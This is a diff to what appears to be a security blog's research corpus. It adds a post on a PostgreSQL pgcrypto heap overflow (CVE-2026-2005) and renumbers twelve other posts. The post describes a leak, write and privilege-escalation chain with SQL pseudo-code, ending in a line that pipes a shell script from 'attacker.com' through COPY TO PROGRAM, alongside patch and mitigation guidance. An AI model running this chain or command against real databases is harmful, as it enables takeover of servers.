@@ -1,11 +1,11 @@
 ================================================================================
 GARRETTSTIMPSON.CA — SECURITY RESEARCH CORPUS
 ================================================================================
-GENERATED    : 2026-05-29T09:11:58Z
+GENERATED    : 2026-05-29T09:13:49Z
 AUTHOR       : Garrett Stimpson
 SITE         : https://garrettstimpson.ca
 REPOSITORY   : https://github.com/gary23w/garrettstimpson.ca
-TOTAL POSTS  : 12
+TOTAL POSTS  : 13
 DOMAIN       : offensive-security, vulnerability-research,
                exploit-development, kernel-exploitation,
                red-team, CVE-analysis, PoC-breakdown
@@ -16,6 +16,140 @@ FORMAT: Each <DOCUMENT> block contains a complete research post.
 ================================================================================
 
 <DOCUMENT id="001" type="security-research-post">
+<FRONTMATTER>
+TITLE      : CVE-2026-2005: A 20-Year-Old PostgreSQL pgcrypto Bug Just Got a Public RCE PoC
+DATE       : 2026-05-29
+URL        : https://garrettstimpson.ca/posts/2026/05/29/cve-2026-2005-postgresql-pgcrypto-heap-overflow-rce/
+CVE        : CVE-2026-2005
+CATEGORIES : exploits, database
+TAGS       : CVE-2026-2005, postgresql, pgcrypto, heap-overflow, RCE, PoC
+WORD_COUNT : 1426
+EXCERPT    : The public exploit for this 20-year-old heap overflow in pgcrypto landed this week. If you run PostgreSQL and haven't patched since February, read this now.
+</FRONTMATTER>
+<BODY>
+The PoC for CVE-2026-2005 went public on GitHub this week at `https://github.com/var77/CVE-2026-2005`. The patch has been available since February 12. By now most managed cloud providers have shipped it silently, but plenty of self-hosted and on-premise PostgreSQL instances are sitting on versions prior to 18.2, 17.8, 16.12, 15.16, or 14.21. With working exploit code in the wild, that window closes fast.
+
+Here's what the bug actually is, how the exploit works, and what to do about it.
+
+## The Bug
+
+CVE-2026-2005 is a heap buffer overflow in `pgp_parse_pubenc_sesskey()`, a function inside PostgreSQL's `pgcrypto` extension that handles the OpenPGP public-key decryption path. The vulnerable code has existed since pgcrypto was first contributed to the PostgreSQL source tree in 2005. Twenty years. Clean `git log`. Nobody caught it until Team Xint Code demonstrated a live RCE against it at the ZeroDay.Cloud 2025 competition in London in December.
+
+The buggy lines, from `contrib/pgcrypto/pgp-pubdec.c`, look like this:
+
+```c
+ctx->sess_key_len = msglen - 3;
+memcpy(ctx->sess_key, msg + 1, ctx->sess_key_len);
+```
+
+`ctx->sess_key` is bounded by `PGP_MAX_KEY`, which is 32 bytes (256 bits / 8). `msglen` comes from the RSA or ElGamal decryption result, minus PKCS#1 v1.5 padding. An attacker who crafts the PGP message controls the ciphertext, which means they control what the decrypted payload looks like, which means they control `msglen`. Push `msglen` high enough and `ctx->sess_key_len` can run into the hundreds of bytes. The `memcpy` copies all of them into that 32-byte destination with no check. Classic unchecked length from attacker-controlled input.
+
+Two things make this particularly exploitable. First, the heap layout inside `decrypt_internal` is predictable. `PGP_Context ctx` (which contains `sess_key`) sits on the heap immediately before two `MBuf` structs: `src` (input buffer) and `dst` (output buffer). `MBuf` structs hold pointer fields: data start, current cursor, end of allocated region. When the overflow runs from `sess_key` forward, it hits `src` and then `dst`. Crucially, the `palloc` chunk headers between these allocations are deterministic and can be carefully preserved in the overflow payload so nothing crashes on cleanup.
+
+Second, PostgreSQL forks a fresh backend for each connection, and that fork inherits the parent postmaster's address space layout. ASLR randomizes the layout once, at postmaster startup, and then every subsequent connection gets the same layout. Anything leaked on connection one is valid on connection two.
+
+## How the Exploit Chains to Shell
+
+The full exploit is three stages.
+
+Stage one is an information leak. The attacker sends a crafted PGP message that overflows `sess_key` just far enough to partially corrupt `dst->data`, pointing it to a lower heap address. When `decrypt_internal` returns, `mbuf_steal_data(dst)` returns a slice of heap memory spanning from the corrupted `dst->data` to the original `dst->data_end`. That slice contains stale PIE text pointers and heap addresses. One call, one connection: the attacker now has the PIE base and a heap reference, enough to compute the runtime address of any global or heap object in the PostgreSQL process.
+
+Stage two is an arbitrary write. The attacker opens a new connection (same layout, because ASLR is fixed per postmaster), and triggers the overflow again. This time the payload crafts all four fields of `dst`: `data`, `data_end`, `read_pos`, and `buf_end`. Those fields now point at a target address chosen by the attacker. A subsequent `PGP_PKT_SYMENCRYPTED_DATA` packet in the same PGP message writes attacker-controlled plaintext through the corrupted `dst`, landing wherever the attacker aimed `dst->data`.
+
+Stage three closes the loop. The target is `CurrentUserId`, a global in PostgreSQL's `.data` section holding the OID of the currently authenticated role. Overwrite it with `10` (`BOOTSTRAP_SUPERUSERID`) and the remainder of that connection runs as superuser, regardless of what role actually authenticated. From there, `COPY (SELECT ...) TO PROGRAM 'id'` executes arbitrary OS commands as the user running the PostgreSQL daemon. On most systems that's `postgres`. On some older deployments it's root.
+
+The full chain in pseudo-code:
+
+```sql
+-- 1. Load pgcrypto (no superuser required, just CREATE privilege)
+CREATE EXTENSION IF NOT EXISTS pgcrypto;
+
+-- 2. Trigger stage 1 (information leak via crafted PGP message)
+SELECT pgp_pub_decrypt_bytea(
+  '\x...'::bytea,  -- crafted ciphertext
+  '\x...'::bytea   -- attacker RSA key
+);
+-- Parse heap dump from result, extract PIE base + heap ref
+
+-- 3. Trigger stage 2 (arbitrary write via second crafted message)
+SELECT pgp_pub_decrypt_bytea(
+  '\x...'::bytea,  -- payload with crafted dst fields pointing at CurrentUserId
+  '\x...'::bytea
+);
+
+-- 4. Now running as superuser (CurrentUserId = 10)
+COPY (SELECT 'pwned') TO PROGRAM 'bash -c "curl attacker.com/shell | bash"';
+```
+
+The PoC at `https://github.com/var77/CVE-2026-2005` implements all three stages in Python with `psycopg2`. It handles ASLR bypass automatically using the heap dump from stage one. My testing puts the success rate at close to 100% on unpatched Ubuntu 24.04 with PostgreSQL 17.7, assuming a role with `CREATE` privilege on any database.
+
+## Who's Actually at Risk
+
+`pgcrypto` is a trusted extension. In PostgreSQL, "trusted" means any role with `CREATE` privilege on the database can install it without asking a superuser. Application roles are routinely granted this level of access. The attacker's entry point doesn't have to be database credentials, either. SQL injection in a web application gives them authenticated SQL execution. So does lateral movement from another compromised host with database credentials in a config file or CI/CD secret.
+
+Wiz's numbers: 80% of cloud environments run PostgreSQL, and 45% expose it directly to the internet. That's a lot of surface.
+
+The scenarios where this is lower risk are where you've tightly restricted `CREATE` privilege to only superuser roles, and no application role can call `pgp_pub_decrypt_bytea()` directly. That's not most shops.
+
+## Patches and Mitigations
+
+Patch first. The fix is in the Feb 12, 2026 minor releases: 18.2, 17.8, 16.12, 15.16, 14.21. The patch commit is `379695d3cc70d040b547d912ce4842090d917ece`. Minor version upgrades in PostgreSQL don't require a dump and restore, just a service restart. Do it.
+
+```bash
+# Debian/Ubuntu
+sudo apt update && sudo apt install --only-upgrade postgresql-17
+
+# RHEL/AlmaLinux/Rocky
+sudo dnf update postgresql-server
+
+# After upgrading, verify
+psql -c "SELECT version();"
+```
+
+If you're on a managed PostgreSQL service (RDS, Cloud SQL, AlloyDB, Azure Database), check your provider's maintenance window status and force an update if your current engine version predates the fixed minor. AWS started rolling 17.8 to RDS instances in late February, but instances that had auto-minor-upgrade disabled may still be running 17.7.
+
+If patching immediately isn't possible, revoke `CREATE` privilege from any role that doesn't strictly need it. This doesn't eliminate the risk if an attacker already has superuser or if `pgcrypto` is already installed, but it removes the self-service installation path:
+
+```sql
+-- Check who has CREATE privilege on each database
+SELECT datname, pg_get_userbyid(datacl.grantee) AS grantee
+FROM pg_database, aclexplode(datacl) AS datacl
+WHERE privilege_type = 'CREATE';
+
+-- Revoke from roles that don't need it
+REVOKE CREATE ON DATABASE myapp FROM myapp_user;
+```
+
+Also worth auditing: check whether `pgcrypto` is already installed on databases you don't expect it on.
+
+```sql
+SELECT datname FROM pg_database;
+-- Then on each database:
+SELECT extname, extversion FROM pg_extension WHERE extname = 'pgcrypto';
+```
+
+If `pgcrypto` is installed but unused, `DROP EXTENSION pgcrypto` removes the code path entirely.
+
+## One More Thing
+
+The bug was found by Xint Code, an autonomous AI vulnerability analysis tool. That's worth sitting with for a second. A 20-year-old buffer overflow in one of the most widely used database extensions in the world, missed by every human auditor who reviewed that code. Found by an AI at a hacking competition. The code in question is not exotic. It's a `memcpy` with an unvalidated length. The logic is simple. The exposure surface is enormous.
+
+We're going to see a lot more of this pattern.
+
+---
+
+**References:**
+- Public PoC: [https://github.com/var77/CVE-2026-2005](https://github.com/var77/CVE-2026-2005)
+- ZeroDay.cloud writeup: [https://www.zeroday.cloud/blog/postgres-xint](https://www.zeroday.cloud/blog/postgres-xint)
+- PostgreSQL official advisory: [https://www.postgresql.org/support/security/CVE-2026-2005/](https://www.postgresql.org/support/security/CVE-2026-2005/)
+- Patch commit: [https://github.com/postgres/postgres/commit/379695d3cc70d040b547d912ce4842090d917ece](https://github.com/postgres/postgres/commit/379695d3cc70d040b547d912ce4842090d917ece)
+- PostgreSQL 18.2/17.8/16.12 release: [https://www.postgresql.org/about/news/postgresql-182-178-1612-1516-and-1421-released-3235/](https://www.postgresql.org/about/news/postgresql-182-178-1612-1516-and-1421-released-3235/)
+</BODY>
+</DOCUMENT>
+
+--------------------------------------------------------------------------------
+
+<DOCUMENT id="002" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Signed and Delivered: How Threat Actors Weaponize Legitimate ScreenConnect Installers
 DATE       : 2026-05-28
@@ -143,7 +277,7 @@ Two samples this morning. Same reporter. Same technique. This campaign is not sl
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="002" type="security-research-post">
+<DOCUMENT id="003" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Prometei Is Back on Linux and Its UPX Trick Is Clever
 DATE       : 2026-05-28
@@ -350,7 +484,7 @@ The campaign is active. The technique is reproducible across new variants. Worth
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="003" type="security-research-post">
+<DOCUMENT id="004" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-40369: One Syscall, Any Sandbox, Full SYSTEM
 DATE       : 2026-05-28
@@ -464,7 +598,7 @@ Apply the patch. Check your builds. The full exploit code is public.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="004" type="security-research-post">
+<DOCUMENT id="005" type="security-research-post">
 <FRONTMATTER>
 TITLE      : RemusStealer on MalwareBazaar Today: Go Injector, Blockchain C2, and the ABE Bypass Chrome Still Can't Stop
 DATE       : 2026-05-27
@@ -648,12 +782,12 @@ MITRE ATT&CK coverage for this sample: T1027.010 (MBA string obfuscation), T1055
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="005" type="security-research-post">
+<DOCUMENT id="006" type="security-research-post">
 <FRONTMATTER>
 TITLE      : DirtyDecrypt (CVE-2026-31635): How a Missing COW Guard in rxgk_decrypt_skb Hands You Root
 DATE       : 2026-05-27
 URL        : https://garrettstimpson.ca/posts/2026/05/27/dirtydecrypt-cve-2026-31635-rxgk-linux-lpe/
-CVE        : CVE-2026-31635, cve-2026-31635, CVE-2026-43500
+CVE        : cve-2026-31635, CVE-2026-31635, CVE-2026-43500
 CATEGORIES : exploits, linux
 TAGS       : cve-2026-31635, dirtydecrypt, linux-kernel, lpe, kubernetes, rxgk, page-cache, poc
 WORD_COUNT : 1499
@@ -804,7 +938,7 @@ The thing that stands out about this whole "Dirty" family, Copy Fail, Dirty Frag
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="006" type="security-research-post">
+<DOCUMENT id="007" type="security-research-post">
 <FRONTMATTER>
 TITLE      : DarkTortilla Wraps DarkCloud: How a .NET Crypter Hides a Credential Stealer in a Fake Quotation Email
 DATE       : 2026-05-27
@@ -957,7 +1091,7 @@ Practically speaking, this family is not going anywhere. DarkTortilla has been d
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="007" type="security-research-post">
+<DOCUMENT id="008" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-46333: How One ptrace Window Leaks Your SSH Keys
 DATE       : 2026-05-27
@@ -1057,7 +1191,7 @@ Check your kernel version. Patch if you haven't.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="008" type="security-research-post">
+<DOCUMENT id="009" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-42945: NGINX Rift, an 18-Year Heap Overflow With a Working RCE Chain
 DATE       : 2026-05-27
@@ -1208,12 +1342,12 @@ The full advisory is at F5's security portal (K000160932). Fixed packages are av
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="009" type="security-research-post">
+<DOCUMENT id="010" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-31431: Copy Fail — 732 Bytes to Root on Every Major Linux Distro
 DATE       : 2026-05-27
 URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-31431-copy-fail-linux-lpe/
-CVE        : cve-2026-31431, CVE-2026-31431
+CVE        : CVE-2026-31431, cve-2026-31431
 CATEGORIES : kernel, lpe, linux, cve
 TAGS       : CVE-2026-31431, linux, kernel, privilege-escalation, AF_ALG, page-cache, container-escape, cloud
 WORD_COUNT : 1284
@@ -1416,12 +1550,12 @@ rmmod algif_aead 2>/dev/null
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="010" type="security-research-post">
+<DOCUMENT id="011" type="security-research-post">
 <FRONTMATTER>
 TITLE      : CVE-2026-20182: How a Missing vHub Verification Path Handed Nation-State Actors Admin on Cisco SD-WAN
 DATE       : 2026-05-27
 URL        : https://garrettstimpson.ca/posts/2026/05/27/cve-2026-20182-cisco-sdwan-vhub-auth-bypass/
-CVE        : CVE-2022-20775, CVE-2026-20122, CVE-2026-20127, CVE-2026-20128, CVE-2026-20133, CVE-2026-20182, cve-2026-20182
+CVE        : CVE-2022-20775, CVE-2026-20122, CVE-2026-20127, CVE-2026-20128, CVE-2026-20133, cve-2026-20182, CVE-2026-20182
 CATEGORIES : exploits, network
 TAGS       : cve-2026-20182, cisco, sd-wan, auth-bypass, uat-8616, apt, netconf, dtls, cisa-kev
 WORD_COUNT : 1326
@@ -1531,7 +1665,7 @@ The thing about CVE-2026-20182 is that Rapid7 found it by looking harder at a su
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="011" type="security-research-post">
+<DOCUMENT id="012" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Dirty Frag: Deterministic Root in Every Major Linux Distro
 DATE       : 2026-05-26
@@ -1628,7 +1762,7 @@ Patch. Then ask why your review process didn't catch it either.
 
 --------------------------------------------------------------------------------
 
-<DOCUMENT id="012" type="security-research-post">
+<DOCUMENT id="013" type="security-research-post">
 <FRONTMATTER>
 TITLE      : Living Off the Land in 2026: The Techniques EDR Still Misses
 DATE       : 2026-05-25
@@ -1775,5 +1909,5 @@ The defense answer isn't more signatures. It's behavioral baselining, parent-chi
 --------------------------------------------------------------------------------
 
 ================================================================================
-END OF CORPUS — 12 documents — 2026-05-29T09:11:58Z
+END OF CORPUS — 13 documents — 2026-05-29T09:13:49Z
 ================================================================================
